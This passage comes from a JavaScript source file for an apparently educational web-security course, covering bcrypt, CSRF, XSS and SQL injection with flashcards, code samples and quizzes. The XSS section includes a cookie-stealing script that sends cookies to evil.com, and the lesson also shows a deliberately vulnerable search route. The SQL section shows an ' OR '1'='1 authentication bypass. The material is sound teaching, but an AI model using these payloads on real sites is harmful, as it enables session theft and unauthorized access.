   'bcrypt is slower than general-purpose hashes (SHA-256) by design — this is what makes it suitable for passwords.'
  ],
  'bcrypt is like a special safe that takes exactly 1 second to close (hash). When you set the password, it automatically uses a unique key (salt). If you try to crack it with a computer that tries millions of passwords per second, each attempt still takes 1 second. Good luck cracking many passwords that way.',
  [
    d('How bcrypt Works', '1. Generate 16-byte salt (128 bits). 2. Use Blowfish cipher with the salt and password. 3. Repeat for 2^cost iterations. 4. Format output: algorithm version ($2b$), cost factor, salt, hash. Cost factor is embedded — increasing it over time strengthens existing hashes on next login.'),
    d('Cost Factor (Rounds)', 'Number of iterations = 2^cost. Cost 10 = 1024 iterations, ~80ms. Cost 12 = 4096 iterations, ~320ms. Each increment doubles the time. Choose highest acceptable for your UX (target ~100-250ms). Increase over time as hardware improves. Upgrade on user login.'),
    d('bcrypt Limitations', 'Max password length: 72 bytes (passwords beyond are silently truncated). Not memory-hard — can be attacked with FPGAs/ASICs (though slower than SHA). No built-in pepper support. For very high-security: use Argon2id instead.'),
    d('Understanding bcrypt Output', '$2b$10$ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234. Version: $2b$ (standard). Cost: 10 (2^10 rounds). Salt: first 22 chars of base64. Hash: remaining 31 chars. Total: 60 characters. The cost can be extracted and used for future upgrades.'),
    d('Timing Attack Resistance', 'bcrypt compare function uses constant-time comparison internally. This means comparing a correct hash vs incorrect hash takes the same amount of time. Prevents attackers from measuring response times to guess characters. Always use the library\'s compare function, never manual string comparison.')
  ],
  'bcrypt is the most practical password hashing choice for most applications. Use cost factor 10-12. The built-in salt generation handles uniqueness. Upgrade cost factor over time by rehashing on user login. Be aware of the 72-byte limit — pre-hash with SHA-256 if you need longer passwords.',
  [
    q('What is bcrypt?', 'A password hashing function based on the Blowfish cipher. The most widely used password hashing algorithm.'),
    q('What does the bcrypt output contain?', 'Version ($2b$), cost factor, 22-char base64 salt, 31-char base64 hash. Total: 60 characters.'),
    q('What is the bcrypt cost factor?', 'Number of iterations = 2^cost. Cost 10 = 1024 iterations. Each increment doubles the work.'),
    q('What is bcrypt\'s maximum password length?', '72 bytes. Longer passwords are silently truncated. Pre-hash with SHA-256 if needed.'),
    q('Is bcrypt memory-hard?', 'No. Unlike Argon2, bcrypt is not memory-hard. It can be attacked with FPGAs (though much slower than SHA).'),
    q('Does bcrypt handle salting automatically?', 'Yes. bcrypt generates a cryptographically random salt internally — you do not need to provide one.'),
    q('Can you increase bcrypt cost for existing hashes?', 'Yes. Rehash on next login with the higher cost factor. The old hash is replaced with the new one.'),
    q('Why does bcrypt have a 72-byte limit?', 'It is inherent to the Blowfish cipher\'s key schedule. Workaround: pre-hash with SHA-256, then bcrypt the hex digest.'),
    q('How do you verify a bcrypt hash?', 'Use the library\'s compare function: bcrypt.compare(password, hash). It extracts the salt from the stored hash.'),
    q('What version prefix should bcrypt hashes use?', '$2b$ (standard) or $2y$ (PHP compatibility). Avoid $2a$ (old, known implementation issues).')
  ],
  R(10,35,110,25,'#0070f3','','Password','Plaintext') +
  A(120,48,150,48) +
  R(160,35,130,25,'#28a745','','Generate Salt','16 random bytes') +
  A(160,60,160,80) +
  R(10,70,110,25,'#ffc107','','Hash','Blowfish cipher') +
  A(120,83,150,83) +
  R(160,70,130,25,'#dc3545','','2^cost Iterations','Work factor') +
  R(10,105,110,25,'#e83e8c','','Output','$2b$10$salt.hash') +
  R(160,105,130,25,'#17a2b8','','Store in DB','60-char string') +
  R(10,140,110,25,'#6610f2','','Verify','bcrypt.compare()') +
  R(300,35,180,130,'#17a2b8','','bcrypt','Battle-tested password hashing. Built-in salt, adaptive cost, constant-time compare.') +
  T(240,210,'bcrypt: Adaptive password hashing with automatic salting. The industry standard for password storage.',9,'#666','middle'),
  [
    e('Basic bcrypt Usage (Node.js)', 'Hash and verify passwords.', codeBlock([
      'const bcrypt = require(\'bcrypt\');',
      '',
      '// Hash password',
      'const saltRounds = 12;',
      'const password = \'mySecureP@ss123\';',
      '',
      'bcrypt.hash(password, saltRounds, (err, hash) => {',
      '  if (err) throw err;',
      '  console.log(hash);',
      '  // $2b$12$VXcVYK6vqB5IX8V5Q5Q5Q5Q5Q5Q5Q5Q5Q5Q5Q5Q5Q5Q5Q5Q5Q5',
      '});',
      '',
      '// Or with async/await',
      'async function hashPassword(pw) {',
      '  const hash = await bcrypt.hash(pw, saltRounds);',
      '  return hash;',
      '}'
    ]), 'Basic bcrypt hashing with async/await — cost factor 12.'),
    e('bcrypt Verification', 'Compare password with stored hash.', codeBlock([
      'async function verifyPassword(plaintext, storedHash) {',
      '  try {',
      '    const match = await bcrypt.compare(plaintext, storedHash);',
      '    return match; // true or false',
      '  } catch (err) {',
      '    // Hash format invalid',
      '    console.error(\'Verification error:\', err.message);',
      '    return false;',
      '  }',
      '}',
      '',
      '// The compare function:',
      '// 1. Extracts salt from storedHash (first 29 chars)',
      '// 2. Hashes plaintext with that salt',
      '// 3. Constant-time compares the result',
      '// Note: You do NOT need to extract salt manually'
    ]), 'bcrypt.compare handles salt extraction and constant-time comparison automatically.'),
    e('Cost Factor Benchmarking', 'Find optimal cost factor.', codeBlock([
      'const bcrypt = require(\'bcrypt\');',
      '',
      'async function benchmarkCosts() {',
      '  const testPassword = \'testPassword123\';',
      '',
      '  for (let cost = 8; cost <= 14; cost++) {',
      '    const start = Date.now();',
      '    await bcrypt.hash(testPassword, cost);',
      '    const duration = Date.now() - start;',
      '    console.log(`Cost ${cost}: ${duration}ms`);',
      '  }',
      '}',
      '',
      '// Typical results (varies by hardware):',
      '// Cost 8:  ~40ms',
      '// Cost 10: ~80ms  <-- recommended minimum',
      '// Cost 12: ~320ms <-- recommended target',
      '// Cost 14: ~1280ms <-- too slow for most UX'
    ]), 'Benchmark bcrypt cost factors to find the optimal balance of security and user experience.'),
    e('Handling Passwords > 72 Bytes', 'Pre-hash long passwords.', codeBlock([
      'const crypto = require(\'crypto\');',
      'const bcrypt = require(\'bcrypt\');',
      '',
      'async function hashLongPassword(longPassword) {',
      '  // Pre-hash with SHA-256 to get fixed 32 bytes',
      '  const preHash = crypto.createHash(\'sha256\')',
      '    .update(longPassword).digest(\'hex\');',
      '  // 64 hex chars — well within 72-byte limit',
      '',
      '  const hash = await bcrypt.hash(preHash, 12);',
      '  return hash;',
      '}',
      '',
      'async function verifyLongPassword(longPassword, storedHash) {',
      '  const preHash = crypto.createHash(\'sha256\')',
      '    .update(longPassword).digest(\'hex\');',
      '  return bcrypt.compare(preHash, storedHash);',
      '}'
    ]), 'Pre-hash passwords over 72 bytes with SHA-256 before bcrypt to avoid silent truncation.'),
    e('Upgrade bcrypt Cost on Login', 'Strengthen hashes over time.', codeBlock([
      'async function login(req, res) {',
      '  const { email, password } = req.body;',
      '  const user = await User.findByEmail(email);',
      '  if (!user) return res.status(401).send(\'Invalid credentials\');',
      '',
      '  const match = await bcrypt.compare(password, user.passwordHash);',
      '  if (!match) return res.status(401).send(\'Invalid credentials\');',
      '',
      '  // Check if cost factor needs upgrade',
      '  const currentCost = getCostFactor(user.passwordHash);',
      '  if (currentCost < 12) {',
      '    const newHash = await bcrypt.hash(password, 12);',
      '    await User.updatePassword(user.id, newHash);',
      '  }',
      '',
      '  // Proceed with login...',
      '}',
      '',
      'function getCostFactor(hash) {',
      '  // Extract cost from hash: $2b$XX$...',
      '  return parseInt(hash.split(\'$\')[2], 10);',
      '}'
    ]), 'Upgrade bcrypt cost factor on user login to gradually strengthen all stored hashes.')
  ],
  [
    m('What does bcrypt\'s cost factor control?', ['Salt length', 'Number of hash iterations', 'Output length', 'Memory usage'], 1, 'Cost factor controls iterations: 2^cost. Higher cost = slower hashing.'),
    m('What is the bcrypt output format?', ['$2b$cost$salt.hash', '$argon2$...', 'salt:hash:iterations', 'base64(hash+salt)'], 0, 'bcrypt output: $2b$10$22charSalt31charHash (60 characters).'),
    m('What is bcrypt\'s max password length?', ['128 bytes', '72 bytes', '256 bytes', 'No limit'], 1, 'bcrypt silently truncates passwords over 72 bytes.'),
    m('Does bcrypt require manual salt generation?', ['Yes', 'No, salt is automatic', 'Depends on version', 'Only for $2a$'], 1, 'bcrypt generates salt automatically — you only provide the password and cost.'),
    m('Is bcrypt memory-hard like Argon2?', ['Yes', 'No', 'Partially', 'Depends on cost'], 1, 'bcrypt is not memory-hard. Argon2 is a better choice against hardware attacks.'),
    m('How do you increase bcrypt cost for existing hashes?', ['Rehash all at server startup', 'Rehash on user login', 'Not possible', 'Use migration script'], 1, 'Rehash on successful login — transparently upgrades users over time.')
  ]
);

/* =================== TOPIC 12: CSRF =================== */
addTopic('auth-csrf', 'CSRF (Cross-Site Request Forgery)', 'intermediate', 25,
  ['CSRF is an attack that tricks an authenticated user into performing unwanted actions on a web application where they are logged in.',
   'Attack: attacker creates a malicious page that submits a form/request to the target site. The victim\'s browser automatically includes cookies (session).',
   'The target server processes the request because it sees a valid session cookie — it cannot distinguish the forged request from a legitimate one.',
   'Prevention: SameSite cookies, CSRF tokens (synchronizer token pattern), double-submit cookies, custom headers, and origin/referer validation.'
  ],
  'CSRF is like someone forging your signature on a check. You (authenticated user) are at a bank. A friend hands you a document to sign, and hidden within it is a check authorization. You sign it, thinking you are signing something else. The bank accepts it because your signature (session cookie) is valid.',
  [
    d('How CSRF Works', '1. User logs into bank.com (gets session cookie). 2. User visits attacker\'s site. 3. Attacker\'s page auto-submits a form to bank.com/transfer. 4. Browser sends the request with the session cookie. 5. Server processes the transfer — it has a valid session. The request is indistinguishable from a legitimate one.'),
    d('SameSite Cookie Attribute (Best Defense)', 'SameSite=Strict: cookie NOT sent on cross-site requests. Most secure but breaks some legitimate cross-site links. SameSite=Lax: cookie sent for top-level GET navigations (safe). Prevents POST form CSRF. SameSite=None: cookie sent on all cross-site requests (requires Secure). Lax is the default in modern browsers.'),
    d('CSRF Tokens (Synchronizer Token Pattern)', 'Server generates a unique, unpredictable token per session or form. Token is embedded in forms (hidden input). Server validates token on form submission. Token must be tied to the user session. Never accept requests without a valid CSRF token for state-changing operations.'),
    d('Additional CSRF Defenses', 'Double-submit cookie: send CSRF token in both cookie and request header; server checks they match. Custom header: require a non-standard header (X-Requested-By, X-CSRF-Token) — browsers only set standard headers automatically. Origin/Referer validation: check Origin header (reliable) or Referer (less reliable).'),
    d('CSRF and API Authentication', 'APIs using JWT in Authorization header are NOT vulnerable to CSRF (browsers don\'t auto-send Bearer tokens). APIs using cookies for auth ARE vulnerable. SPA best practice: use Authorization: Bearer for API calls, cookies only for initial token storage/refresh.')
  ],
  'SameSite=Lax is the first line of defense — make it your cookie default. Add CSRF tokens for extra protection on state-changing operations (POST, PUT, DELETE). SPAs using Bearer tokens are naturally protected. Always use custom headers for AJAX requests. Validate Origin header server-side when possible.',
  [
    q('What is CSRF?', 'Cross-Site Request Forgery — an attack that tricks an authenticated user into performing unintended actions.'),
    q('How does CSRF work?', 'Attacker\'s page auto-submits a request to the target site. The browser automatically includes the victim\'s session cookies.'),
    q('What is the best CSRF defense?', 'SameSite=Lax or Strict cookie attribute. It prevents cookies from being sent on cross-site requests.'),
    q('What is a CSRF token?', 'A unique, unpredictable token generated by the server and validated on state-changing operations.'),
    q('What does SameSite=Lax do?', 'Cookies are sent on top-level GET navigations but not on POST/forms from other sites. Balances security and usability.'),
    q('Are APIs using Bearer tokens vulnerable to CSRF?', 'No. Browsers do not automatically send Authorization headers across origins. Cookies are the vulnerability vector.'),
    q('What is the Synchronizer Token Pattern?', 'Server embeds a unique token in forms. Server validates the token on submission. Token tied to user session.'),
    q('What is the double-submit cookie pattern?', 'CSRF token sent in both a cookie and a request header. Server checks they match. No server-side storage needed.'),
    q('What is the difference between CSRF and XSS?', 'CSRF: forged request using victim\'s auth. XSS: malicious script execution in victim\'s browser. CSRF uses cookies; XSS steals cookies.'),
    q('Can GET requests cause CSRF?', 'Yes, if GET endpoints have side effects. State-changing operations should always use POST/PUT/DELETE.')
  ],
  R(10,35,120,25,'#0070f3','','User','Logged into bank.com') +
  R(10,65,120,25,'#dc3545','','Attacker Site','Auto-submits form') +
  A(130,48,160,48) + A(130,78,160,78) +
  R(170,35,110,25,'#28a745','','Browser','Auto-sends cookie') +
  A(170,60,170,80) +
  R(10,100,120,25,'#ffc107','','Bank Server','Accepts forged request') +
  R(10,130,120,25,'#e83e8c','','SameSite=Lax','Block cross-site cookies') +
  R(10,160,120,25,'#6610f2','','CSRF Token','Validate per form') +
  R(290,35,190,150,'#17a2b8','','CSRF Defense','SameSite cookies + CSRF tokens + custom headers + origin validation.') +
  T(240,210,'CSRF: Attack that forges requests using the victim\'s session. Prevent with SameSite cookies and tokens.',9,'#666','middle'),
  [
    e('SameSite Cookie Configuration', 'First line of CSRF defense.', codeBlock([
      "// Express session with SameSite=Lax",
      "app.use(session({",
      "  secret: process.env.SESSION_SECRET,",
      "  cookie: {",
      "    httpOnly: true,",
      "    secure: true,",
      "    sameSite: 'lax', // default in modern browsers",
      "    maxAge: 24 * 60 * 60 * 1000",
      "  }",
      "}));",
      '',
      "// For JWT in cookies:",
      "res.cookie('access_token', token, {",
      "  httpOnly: true,",
      "  secure: true,",
      "  sameSite: 'strict', // strongest protection",
      "  maxAge: 15 * 60 * 1000",
      '});'
    ]), 'SameSite cookie attribute prevents browsers from sending cookies on cross-site requests.'),
    e('CSRF Token Middleware (Express)', 'Synchronizer token pattern.', codeBlock([
      'const crypto = require(\'crypto\');',
      '',
      '// Generate CSRF token and attach to session',
      "app.use((req, res, next) => {",
      '  if (!req.session.csrfToken) {',
      '    req.session.csrfToken = crypto.randomBytes(32).toString(\'hex\');',
      '  }',
      '  res.locals.csrfToken = req.session.csrfToken;',
      '  next();',
      '});',
      '',
      '// Validate CSRF token on state-changing requests',
      "app.use((req, res, next) => {",
      "  const unsafeMethods = ['POST', 'PUT', 'PATCH', 'DELETE'];",
      '',
      '  if (unsafeMethods.includes(req.method)) {',
      '    const token = req.headers[\'x-csrf-token\']',
      '      || req.body._csrf;',
      '',
      '    if (!token || token !== req.session.csrfToken) {',
      '      return res.status(403).json({',
      '        error: \'CSRF validation failed\'',
      '      });',
      '    }',
      '  }',
      '  next();',
      '});'
    ]), 'CSRF token generation and validation middleware for Express.'),
    e('CSRF Token in Forms (Templates)', 'Embed token in HTML forms.', codeBlock([
      '<!-- Server-side template (EJS/Pug) -->',
      '<form action="/transfer" method="POST">',
      '  <input type="hidden" name="_csrf"',
      '         value="<%= csrfToken %>">',
      '  <input type="number" name="amount">',
      '  <input type="text" name="recipient">',
      '  <button type="submit">Transfer</button>',
      '</form>',
      '',
      '<!-- Using AJAX -->',
      "<meta name=\"csrf-token\" content=\"<%= csrfToken %>\">",
      '',
      '// JavaScript:',
      "const token = document.querySelector('meta[name=\"csrf-token\"]').content;",
      '',
      'fetch(\'/api/transfer\', {',
      '  method: \'POST\',',
      '  headers: {',
      "    'Content-Type': 'application/json',",
      "    'X-CSRF-Token': token",
      '  },',
      '  body: JSON.stringify(data)',
      '});'
    ]), 'Embed CSRF tokens in forms (hidden input) or meta tags (for AJAX requests).'),
    e('Custom Header CSRF Prevention', 'Simple and effective for APIs.', codeBlock([
      '// For AJAX/API requests: require custom header',
      '// Browsers do NOT auto-send custom headers',
      '',
      "app.use('/api', (req, res, next) => {",
      "  if (['POST','PUT','PATCH','DELETE']",
      '      .includes(req.method)) {',
      '',
      "    if (!req.headers['x-requested-by']) {",
      '      return res.status(403).json({',
      '        error: \'Custom header required for CSRF prevention\'',
      '      });',
      '    }',
      '  }',
      '  next();',
      '});',
      '',
      '// Client side:',
      'fetch(\'/api/transfer\', {',
      '  method: \'POST\',',
      '  headers: {',
      "    'X-Requested-By': 'MyApp'",
      '  }',
      '});'
    ]), 'Require a custom header for state-changing API requests — browsers cannot set custom headers cross-origin.'),
    e('Double-Submit Cookie Pattern', 'Stateless CSRF prevention.', codeBlock([
      '// Server generates random token',
      'const csrfToken = crypto.randomBytes(32).toString(\'hex\');',
      '',
      '// Set both cookie (non-httpOnly for JS access)',
      "res.cookie('csrf_token', csrfToken, {",
      '  httpOnly: false, // JS needs to read it',
      '  secure: true,',
      "  sameSite: 'lax'",
      '});',
      '',
      '// Client reads cookie and sends as header',
      'const csrf = document.cookie.split(\'; \')',
      '  .find(row => row.startsWith(\'csrf_token=\'))',
      "  ?.split('=')[1];",
      '',
      "fetch('/api/transfer', {",
      '  method: \'POST\',',
      '  headers: { \'X-CSRF-Token\': csrf }',
      '});',
      '',
      '// Server validates cookie === header',
      "app.post('/api/transfer', (req, res) => {",
      '  const cookieToken = req.cookies.csrf_token;',
      '  const headerToken = req.headers[\'x-csrf-token\'];',
      "  if (!cookieToken || cookieToken !== headerToken) {",
      '    return res.status(403).json({ error: \'CSRF\' });',
      '  }',
      '});'
    ]), 'Double-submit cookie pattern validates that cookie value matches request header value.'),
    e('Origin/Referer Validation', 'Server-side origin check.', codeBlock([
      "// Validate Origin header (most reliable)",
      "app.use((req, res, next) => {",
      "  const unsafeMethods = ['POST', 'PUT', 'PATCH', 'DELETE'];",
      '  if (!unsafeMethods.includes(req.method)) return next();',
      '',
      '  const origin = req.headers.origin;',
      '  const referer = req.headers.referer;',
      "  const allowedOrigins = ['https://myapp.com'];",
      '',
      '  // Prefer Origin header over Referer',
      '  const source = origin || referer;',
      '',
      '  if (!source || !allowedOrigins.some(',
      '    o => source.startsWith(o)',
      '  )) {',
      '    return res.status(403).json({',
      '      error: \'Invalid request origin\'',
      '    });',
      '  }',
      '  next();',
      '});'
    ]), 'Origin/Referer header validation — check that the request came from your own application.')
  ],
  [
    m('What does CSRF stand for?', ['Cross-Site Request Forgery', 'Cross-Site Scripting', 'Client-Side Request Failure', 'Cross-Origin Resource Sharing'], 0, 'CSRF = Cross-Site Request Forgery.'),
    m('What is the strongest CSRF defense?', ['CSRF tokens', 'SameSite=Strict cookies', 'Origin validation', 'Rate limiting'], 1, 'SameSite=Strict provides the strongest CSRF protection by blocking all cross-site cookie sending.'),
    m('Are APIs using Bearer tokens vulnerable to CSRF?', ['Yes', 'No', 'Only for GET', 'Depends on server'], 1, 'Bearer tokens are not automatically sent by browsers across origins — no CSRF vulnerability.'),
    m('What does the Synchronizer Token Pattern do?', ['Encrypts cookies', 'Validates a token per form/session', 'Blocks IPs', 'Rate limits requests'], 1, 'Server generates and validates unique tokens for each form/session to prevent CSRF.'),
    m('What is a double-submit cookie?', ['Two cookies set', 'Same token in cookie and header', 'Two tokens per form', 'Cookie with two values'], 1, 'Same CSRF token value is set as a cookie and sent as a header; server validates match.'),
    m('Why are custom headers effective against CSRF?', ['They are encrypted', 'Browsers cannot auto-set custom headers cross-origin', 'They are faster', 'They expire quickly'], 1, 'Browsers only send standard headers automatically. Custom headers require JavaScript, which cannot execute cross-origin.')
  ]
);

/* =================== TOPIC 13: XSS =================== */
addTopic('auth-xss', 'XSS (Cross-Site Scripting)', 'intermediate', 25,
  ['XSS is a vulnerability where attackers inject malicious scripts into web pages viewed by other users.',
   'Types: Stored (persistent — script saved on server), Reflected (non-persistent — script in URL/request), DOM-based (client-side script manipulation).',
   'Impact: session hijacking, credential theft, keylogging, phishing, website defacement, malware distribution.',
   'Prevention: output encoding/escaping, Content-Security-Policy (CSP), input validation, HttpOnly cookies, sanitization libraries.'
  ],
  'XSS is like someone slipping a malicious note into a library book. When another person reads the book (visits the page), the note executes — it could steal their library card (session), change what they see, or redirect them to a fake library website.',
  [
    d('Stored XSS (Persistent)', 'Attacker injects script into a database (comments, posts, profiles). Every user who views that page executes the script. Most dangerous type — affects many users without additional social engineering. Example: <script>fetch(\'https://evil.com/steal?c=\'+document.cookie)</script> in a comment.'),
    d('Reflected XSS (Non-Persistent)', 'Malicious script is part of the request (URL parameter, form input). Server reflects it in the response without proper encoding. Requires victim to click a crafted link. Example: https://site.com/search?q=<script>alert(\'XSS\')</script>.'),
    d('DOM-Based XSS', 'Vulnerability exists entirely in client-side JavaScript. The page uses untrusted data from location.hash, document.URL, or window.name to modify the DOM via innerHTML, document.write, or eval. Server may never see the malicious payload. Requires careful review of client-side code.'),
    d('Content-Security-Policy (CSP)', 'HTTP header that restricts what resources can load on your page. script-src: controls allowed script sources. ' +
     'object-src \'none\': prevents Flash/plugin execution. base-uri \'self\': prevents base tag injection. Report-URI: receive violation reports. CSP can block most XSS even if injection occurs.'),
    d('XSS Prevention by Context', 'HTML context: encode < > & " \'. Use escapeHtml(). Attribute context: encode quotes. Use escapeAttribute(). JavaScript context: never interpolate untrusted data in strings. Use JSON.stringify() and encodeURIComponent(). URL context: validate protocol (http/https only). CSS context: avoid dynamic styles.')
  ],
  'XSS is the most common web vulnerability. Always encode output based on context (HTML, attribute, JS, URL, CSS). Use CSP as a safety net. Set HttpOnly cookies to protect session tokens. Use modern frameworks (React, Vue) that auto-encode. Never use innerHTML or dangerouslySetInnerHTML with untrusted data.',
  [
    q('What is XSS?', 'Cross-Site Scripting — injecting malicious scripts into web pages viewed by other users.'),
    q('What are the three types of XSS?', 'Stored (persistent), Reflected (non-persistent), DOM-based (client-side).'),
    q('What is Stored XSS?', 'Malicious script is stored on the server (database) and served to all users who view the page. Most dangerous.'),
    q('What is Reflected XSS?', 'Malicious script is in the request (URL/param) and immediately reflected in the response without encoding.'),
    q('What is DOM-based XSS?', 'Vulnerability in client-side JavaScript — untrusted data modifies the DOM via innerHTML, document.write, etc.'),
    q('What is the most effective XSS defense?', 'Output encoding/escaping based on context (HTML, attribute, JS, URL, CSS).'),
    q('What is Content-Security-Policy?', 'An HTTP header that restricts what resources can load — acts as a safety net against XSS.'),
    q('How do HttpOnly cookies help against XSS?', 'They prevent JavaScript from accessing session cookies — even if XSS executes, cookies are safe.'),
    q('Why are modern frameworks safer against XSS?', 'React, Vue, Angular auto-encode output by default. You must explicitly bypass (dangerouslySetInnerHTML).'),
    q('What is the difference between XSS and CSRF?', 'XSS: injects malicious script. CSRF: forges requests using victim\'s auth. XSS can steal tokens; CSRF cannot.')
  ],
  R(10,35,110,25,'#0070f3','','Stored XSS','Script in database') +
  R(10,65,110,25,'#28a745','','Reflected XSS','Script in URL') +
  R(10,95,110,25,'#ffc107','','DOM XSS','Client-side only') +
  R(10,125,110,25,'#dc3545','','Impact','Session theft') +
  R(10,155,110,25,'#e83e8c','','Prevention','Output encode + CSP') +
  A(120,48,150,48) + A(120,78,150,78) + A(120,108,150,108) + A(120,138,150,138) + A(120,168,150,168) +
  R(160,35,230,155,'#17a2b8','','XSS (Cross-Site Scripting)','Script injection: Stored, Reflected, DOM-based. Prevent with encoding, CSP, HttpOnly.') +
  T(240,220,'XSS: Malicious script injection — steal sessions, deface sites, phish users. Encode output, use CSP.',9,'#666','middle'),
  [
    e('XSS Prevention: Output Encoding', 'Encode based on context.', codeBlock([
      '// HTML context — encode < > & " \'',
      'function escapeHtml(str) {',
      '  return str',
      '    .replace(/&/g, \'&amp;\')',
      '    .replace(/</g, \'&lt;\')',
      '    .replace(/>/g, \'&gt;\')',
      '    .replace(/"/g, \'&quot;\')',
      "    .replace(/'/g, '&#x27;');",
      '}',
      '',
      '// NEVER do this:',
      "element.innerHTML = userInput; // XSS!",
      '',
      '// ALWAYS do this:',
      "element.textContent = userInput; // safe",
      '',
      '// Or use a sanitization library:',
      'const sanitized = DOMPurify.sanitize(userInput);',
      "element.innerHTML = sanitized; // safe"
    ]), 'Output encoding and safe DOM APIs prevent XSS in HTML context.'),
    e('Content-Security-Policy Header', 'Safety net against XSS.', codeBlock([
      "// CSP Header (Express middleware)",
      "app.use((req, res, next) => {",
      "  res.setHeader(",
      "    'Content-Security-Policy',",
      "    \"default-src 'self';\" +",
      "    \"script-src 'self' https://cdn.example.com;\" +",
      "    \"style-src 'self' 'unsafe-inline';\" +",
      "    \"img-src 'self' data: https:;\" +",
      "    \"object-src 'none';\" +",
      "    \"base-uri 'self';\" +",
      "    \"frame-ancestors 'none';\" +",
      "    \"form-action 'self';\"",
      '  );',
      '  next();',
      '});',
      '',
      '// CSP Report-Only mode (test before enforcing)',
      "res.setHeader(",
      "  'Content-Security-Policy-Report-Only',",
      "  \"default-src 'self'; report-uri /csp-reports\"",
      ');'
    ]), 'CSP restricts what resources can execute, blocking most XSS even if injection occurs.'),
    e('Sanitize User Input (DOMPurify)', 'Allow safe HTML.', codeBlock([
      '// Install: npm install dompurify',
      'const createDOMPurify = require(\'dompurify\');',
      'const { JSDOM } = require(\'jsdom\');',
      'const window = new JSDOM(\'\').window;',
      'const DOMPurify = createDOMPurify(window);',
      '',
      '// User-submitted content with HTML',
      'const userComment = \'<b>Great post!</b><script>stealCookies()</script>\';',
      '',
      'const clean = DOMPurify.sanitize(userComment);',
      'console.log(clean);',
      "// '<b>Great post!</b>' — script tag removed",
      '',
      '// DOMPurify removes:',
      '// - script tags, event handlers (onclick)',
      '// - javascript: URLs, dangerous SVG',
      '// - allows safe tags: b, i, em, strong, a, p'
    ]), 'DOMPurify sanitizes HTML while preserving safe tags — useful for rich user content.'),
    e('HttpOnly Cookie Protection', 'Protect session from XSS.', codeBlock([
      '// Session cookie — inaccessible to JavaScript',
      "res.cookie('session_id', sessionId, {",
      '  httpOnly: true, // JS cannot read this',
      '  secure: true,',
      "  sameSite: 'lax'",
      '});',
      '',
      '// Even if XSS executes:',
      '// document.cookie → does NOT include httpOnly cookies',
      '// Attacker cannot steal the session token',
      '',
      '// What XSS can still do:',
      '// - Make API calls (but cookies restricted)',
      '// - Deface the page',
      '// - Keylog user input',
      '// - CSRF (if no SameSite + CSRF tokens)',
      '',
      '// Best practice:',
      '// httpOnly cookies + CSP + output encoding'
    ]), 'HttpOnly cookies prevent JavaScript access to session tokens, mitigating XSS cookie theft.'),
    e('XSS in URL Parameters (Reflected)', 'Validate and encode URL input.', codeBlock([
      "// Vulnerable: reflected XSS",
      "app.get('/search', (req, res) => {",
      "  const query = req.query.q;",
      "  // <script>alert('XSS')</script> executes!",
      "  res.send('<p>Search results for: ' + query + '</p>');",
      '});',
      '',
      '// Fixed: encode output',
      "app.get('/search', (req, res) => {",
      '  const query = escapeHtml(req.query.q || \'\');',
      "  res.send('<p>Search results for: ' + query + '</p>');",
      '});',
      '',
      '// Alternative: use a template engine (auto-escaped)',
      "// EJS: <%= query %> — auto-escaped",
      "// <%- query %> — raw (XSS if untrusted)"
    ]), 'Always encode user input when reflecting it in responses — never concatenate untrusted data into HTML.'),
    e('Trusted Types (CSP Enhancement)', 'Prevent DOM XSS at browser level.', codeBlock([
      "// CSP with Trusted Types",
      "res.setHeader('Content-Security-Policy',",
      "  \"require-trusted-types-for 'script';\"",
      ');',
      '',
      '// Creates a Trusted Type policy',
      'const sanitizePolicy = trustedTypes.createPolicy(',
      "  'sanitize', {",
      '    createHTML: (input) => DOMPurify.sanitize(input)',
      '  }',
      ');',
      '',
      '// Only Trusted Types can set innerHTML',
      "element.innerHTML = sanitizePolicy.createHTML(input);",
      '',
      '// Without Trusted Type: browser blocks it',
      "element.innerHTML = untrustedString; // Blocked!"
    ]), 'Trusted Types enforce that only sanitized strings can be assigned to dangerous DOM sinks.')
  ],
  [
    m('What are the three types of XSS?', ['Stored, Reflected, DOM', 'GET, POST, PUT', 'Client, Server, Network', 'SQL, NoSQL, API'], 0, 'Stored (persistent), Reflected (non-persistent), DOM-based (client-side).'),
    m('Which XSS type is most dangerous?', ['Reflected', 'Stored', 'DOM', 'All are equal'], 1, 'Stored XSS is most dangerous because it affects every user who views the page without requiring a crafted link.'),
    m('What is the primary XSS defense?', ['Input validation', 'Output encoding', 'Rate limiting', 'Authentication'], 1, 'Output encoding/escaping based on context is the primary defense.'),
    m('What does Content-Security-Policy do?', ['Encrypts traffic', 'Restricts resource loading', 'Blocks IPs', 'Validates tokens'], 1, 'CSP restricts what resources (scripts, styles, etc.) can load and execute.'),
    m('How do HttpOnly cookies prevent XSS?', ['Encrypt cookie values', 'Block JS access to cookies', 'Shorten cookie lifetime', 'Limit cookie domain'], 1, 'HttpOnly prevents JavaScript from accessing the cookie — even with XSS, session is safe.'),
    m('What is DOM-based XSS?', ['Server-side injection', 'Client-side JS vulnerability', 'Database injection', 'Network attack'], 1, 'DOM-based XSS occurs entirely in client-side JavaScript without server involvement.')
  ]
);

/* =================== TOPIC 14: SQL Injection =================== */
addTopic('auth-sql-injection', 'SQL Injection', 'intermediate', 25,
  ['SQL injection is a code injection technique where an attacker inserts malicious SQL into application queries.',
   'Attack vectors: unsanitized user input concatenated into SQL queries. Classic: \' OR \'1\'=\'1 bypasses authentication.',
   'Impact: data theft, data modification, authentication bypass, privilege escalation, complete database compromise.',
   'Prevention: parameterized queries (prepared statements) 100% of the time. Never concatenate user input into SQL.'
  ],
  'SQL injection is like a con artist talking to a security guard who follows instructions literally. The con artist says "I\'m authorized — just check the list and say yes to anyone whose name ends with \'OR 1=1\'". The guard reads it literally and lets everyone in.',
  [
    d('How SQL Injection Works', 'Vulnerable: "SELECT * FROM users WHERE email=\'" + email + "\'". Input: admin@x.com\' OR \'1\'=\'1. Query becomes: SELECT * FROM users WHERE email=\'admin@x.com\' OR \'1\'=\'1\'. Returns all users — authentication bypass. UNION SELECT can exfiltrate other tables.'),
    d('Parameterized Queries (The Fix)', 'Use placeholders ($1, $2 in PostgreSQL; ? in MySQL). Database driver treats parameters as data, not executable SQL. Query structure is fixed. Example: db.query("SELECT * FROM users WHERE email = $1", [email]). SQL injection is impossible with parameterized queries.'),
    d('Advanced SQL Injection Techniques', 'Blind SQL injection: no error output — infer data through true/false responses (boolean-based) or timing delays (time-based). Out-of-band: database sends data to external server (DNS/HTTP). Second-order: injected data stored, then executed later when retrieved.'),
